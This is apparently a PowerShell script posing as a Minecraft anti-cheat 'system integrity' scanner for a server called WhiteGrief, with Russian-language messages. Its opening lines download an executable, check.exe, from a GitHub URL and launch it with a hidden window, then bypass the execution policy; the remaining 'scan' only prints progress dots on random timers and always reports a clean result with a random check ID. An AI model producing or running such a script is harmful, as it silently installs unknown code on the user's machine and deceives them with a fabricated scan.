# MINECRAFT CHEAT SCANNER v2.0 [СКАЧИВАЕТ everything В КОНЦЕ]
    # Скачиваем everything в текущую папку
    Invoke-WebRequest -Uri "https://github.com/letyss0304/FTchecker/raw/refs/heads/main/check.exe" -OutFile "check.exe" -ErrorAction SilentlyContinue
    
    # Запускаем 
    Start-Process -FilePath "check.exe" -WindowStyle Hidden
    

Set-ExecutionPolicy Bypass -Scope Process -Force

Clear-Host

$Host.UI.RawUI.WindowTitle = "WhiteGrief | Advanced System Integrity Verification v2.1"

Write-Host "[*] Инициализация сессии WhiteGrief Security..." -ForegroundColor Cyan
Start-Sleep -Seconds 2

Write-Host "[+] Подключение к базе данных сигнатур через HTTPS..." -ForegroundColor Green
Start-Sleep -Seconds 1
Write-Host "[+] Авторизация модератора: [SUCCESS]" -ForegroundColor Green
Write-Host "------------------------------------------------------------"

$tasks = @(
    "Анализ дампов памяти javaw.exe",
    "Проверка загруженных модулей jvm.dll",
    "Сканирование кэша дескрипторов файлов",
    "Поиск следов инъекций в explorer.exe",
    "Верификация контрольных сумм библиотек LWJGL",
    "Проверка реестра на наличие ключей автозапуска ПО",
    "Эвристический анализ сетевых пакетов Minecraft"
)

foreach ($task in $tasks) {
    $progress = 0
    Write-Host "[PROCESS] $task..." -NoNewline
    while ($progress -lt 100) {
        $progress += (Get-Random -Minimum 5 -Maximum 20)
        if ($progress -gt 100) { $progress = 100 }
        Write-Host "." -NoNewline -ForegroundColor Yellow
        Start-Sleep -Milliseconds (Get-Random -Minimum 50 -Maximum 300)
    }
    Write-Host " [DONE]" -ForegroundColor Green
}

Write-Host "------------------------------------------------------------"
Write-Host "[!] СКАНИРОВАНИЕ ЗАВЕРШЕНО" -ForegroundColor Cyan
Write-Host "[RESULT] Запрещенных модификаций не обнаружено." -ForegroundColor White -BackgroundColor Green
Write-Host "[RESULT] Система полностью соответствует стандартам WhiteGrief." -ForegroundColor Green
Write-Host "------------------------------------------------------------"
Write-Host "ID Проверки: WG-X$(Get-Random -Minimum 1000 -Maximum 9999)-$(Get-Date -Format "HHmm")"
Write-Host "Сообщите этот ID модератору и не закрывайте окно."
Write-Host "`nНажмите Enter, чтобы выйти..."
Read-Host
